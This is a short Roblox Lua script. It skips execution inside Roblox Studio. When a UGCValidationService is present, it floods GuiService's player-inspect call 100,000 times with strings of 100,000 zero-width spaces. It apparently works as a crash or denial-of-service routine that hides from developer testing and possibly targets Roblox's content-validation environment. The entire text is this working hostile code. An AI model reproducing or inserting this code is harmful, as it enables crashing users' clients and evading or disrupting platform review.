local GuiService = game:GetService("GuiService")
local RunService = game:GetService("RunService")

if RunService:IsStudio() then return end

task.spawn(function()
	while true do
		if game:FindService("UGCValidationService") then
			for i = 1, 1e5 do
				local hd = Instance.new("HumanoidDescription")
				hd.FaceAccessory = "0"
				GuiService:CloseInspectMenu()
				GuiService:InspectPlayerFromHumanoidDescription(hd, string.rep(utf8.char(8203), 1e5) .. "")
			end
		end
		task.wait(1.5)
	end
end)
